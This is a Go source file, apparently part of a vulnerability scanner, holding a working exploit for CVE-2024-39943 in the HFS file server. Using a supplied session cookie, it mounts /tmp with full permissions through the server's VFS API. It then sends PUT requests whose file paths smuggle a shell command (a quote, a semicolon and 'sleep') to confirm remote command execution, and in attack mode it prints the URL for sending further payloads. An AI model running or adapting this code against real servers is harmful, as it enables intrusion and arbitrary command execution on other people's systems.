package CVEs

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var Cookie string

func CVE_2024_39943(url string, Attack bool) error {
	//fmt.Println("CVE_2024_39943")
	cookie := Cookie
	payload1 := "{\"parent\": \"/\", \"source\": \"/tmp\"}"
	payload2 := "{\"uri\":\"/tmp/\",\"props\":{\"can_see\":true,\"can_read\":true,\"can_list\":true,\"can_upload\":true,\"can_delete\":true,\"can_archive\":true,\"source\":\"/tmp\",\"name\":\"tmp\",\"type\":\"folder\",\"masks\":null}}"
	payload3 := "poc"
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Content-Type":    "application/json",
		"x-hfs-anti-csrf": "1",
		"Cookie":          cookie,
	}
	headers2 := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"Content-Type":    "application/json",
		"x-hfs-anti-csrf": "1",
		"Cookie":          cookie,
	}
	headers3 := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"x-hfs-anti-csrf": "1",
		"Cookie":          cookie,
	}

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	//添加目录
	url1 := fmt.Sprintf("%s/~/api/add_vfs", url)
	req1, err := http.NewRequest("POST", url1, strings.NewReader(payload1))
	if err != nil {
		return err
	}
	for key, value := range headers {
		req1.Header.Set(key, value)
	}
	req1.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload1).Len()))
	client.Do(req1)

	//设置目录
	url2 := fmt.Sprintf("%s/~/api/set_vfs", url)
	req2, err := http.NewRequest("POST", url2, strings.NewReader(payload2))
	if err != nil {
		return err
	}

	for key, value := range headers2 {
		req2.Header.Set(key, value)
	}

	req2.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload2).Len()))
	client.Do(req2)

	//执行代码
	url3 := fmt.Sprintf("%s/tmp/poc%%22%%3Bsleep%%200;%%22/poc.txt", url)
	req3, err := http.NewRequest("PUT", url3, strings.NewReader(payload3))
	if err != nil {
		return err
	}
	for key, value := range headers3 {
		req3.Header.Set(key, value)
	}
	req3.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload3).Len()))

	client.Do(req3)
	if err != nil {
		return err
	}
	//再次执行
	url4 := fmt.Sprintf("%s/tmp/poc%%22%%3Bsleep%%203;%%22/poc.txt", url)
	req4, err := http.NewRequest("PUT", url4, strings.NewReader(payload3))
	if err != nil {
		return err
	}
	for key, value := range headers3 {
		req4.Header.Set(key, value)
	}
	req4.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload3).Len()))

	response4, err := client.Do(req4)
	if err != nil {
		return err
	}
	defer response4.Body.Close()
	// 遍历头部信息
	for key, values := range response4.Header {
		if strings.Contains(key, "hfs_http") && response4.StatusCode == 200 {
			fmt.Println("[*]CVE-2024-39943 : " + url)
			if Attack {
				fmt.Println("Attack-Result : " + "请以PUT方法请求" + url3 + "，并传入data请求体\n")
			}
			break
		}
		for _, value := range values {
			if strings.Contains(value, "hfs_http") && response4.StatusCode == 200 {
				fmt.Println("[*]CVE-2024-39943 : " + url)
				if Attack {
					fmt.Println("Attack-Result : " + "请以PUT方法请求" + url3 + "，并传入data请求体\n")
				}
				break
			}
		}
	}

	return nil
}

// 返回代理 URL
func proxyURL() *url.URL {
	proxyURL, _ := url.Parse("http://127.0.0.1:9876")
	return proxyURL
}
